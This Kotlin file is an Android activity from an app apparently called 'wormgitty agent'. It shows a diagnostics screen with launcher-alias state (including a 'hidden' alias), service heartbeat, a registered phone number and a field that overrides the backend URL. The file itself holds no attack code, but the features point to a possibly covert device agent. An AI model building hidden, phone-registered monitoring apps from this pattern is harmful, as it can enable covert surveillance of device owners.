package com.wormgitty.agent

import android.content.ComponentName
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.os.Bundle
import android.widget.LinearLayout
import android.widget.TextView
import androidx.activity.ComponentActivity

/**
 * Read-only diagnostics: alias state, service health from disk only,
 * last heartbeat, registered phone. In-process flags are never trusted here.
 */
class StatusActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val col = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.WHITE)
        }
        collect().forEach { pair ->
            col.addView(
                TextView(this).apply {
                    text = pair.first
                    textSize = 15f
                    setTypeface(typeface, Typeface.BOLD)
                    setPadding(dp(16), dp(14), dp(16), dp(2))
                }
            )
            col.addView(
                TextView(this).apply {
                    text = pair.second
                    textSize = 17f
                    setPadding(dp(16), dp(0), dp(16), dp(10))
                }
            )
        }
        // Runtime endpoint override — persisted; wins over BuildConfig.WG_BASE_URL.
        val endpoint = android.widget.EditText(this).apply {
            hint = getString(R.string.endpoint_hint)
            setText(BackendClient.baseUrl)
            setSingleLine()
        }
        val save = android.widget.Button(this).apply {
            text = getString(R.string.endpoint_save)
            setOnClickListener {
                val v = endpoint.text.toString().trim()
                kotlinx.coroutines.runBlocking {
                    EndpointPrefs(this@StatusActivity).setOverride(v)
                }
                BackendClient.baseUrl = v.ifBlank { BuildConfig.WG_BASE_URL }
            }
        }
        col.addView(endpoint)
        col.addView(save)
        setContentView(col)
    }

    private fun collect(): List<Pair<String, String>> {
        val pm = packageManager
        val pkg = packageName
        val boost = pm.getComponentEnabledSetting(
            ComponentName(pkg, "com.wormgitty.agent.LauncherBoost"))
        val hidden = pm.getComponentEnabledSetting(
            ComponentName(pkg, "com.wormgitty.agent.LauncherHidden"))
        val alias = when {
            hidden == PackageManager.COMPONENT_ENABLED_STATE_ENABLED ->
                getString(R.string.alias_hidden_label)

            boost == PackageManager.COMPONENT_ENABLED_STATE_ENABLED ->
                getString(R.string.app_name)

            else -> "?"
        }
        val now = System.currentTimeMillis()
        val health = HealthStore.read(this)
        val healthValue = when {
            health == null -> "-"
            HealthStore.isStale(health, now) -> getString(R.string.health_state_stale)
            else -> getString(R.string.health_state_running)
        }
        val beatAge = health?.let { (now - it.lastBeat) / 1000 }
        return listOf(
            getString(R.string.status_alias_state) to alias,
            getString(R.string.status_service_alive) to healthValue,
            getString(R.string.status_last_heartbeat) to
                (beatAge?.let { "${it}s" } ?: "-"),
            getString(R.string.status_phone) to (RegistrationStore(this).load()?.phone ?: "-")
        )
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()
}
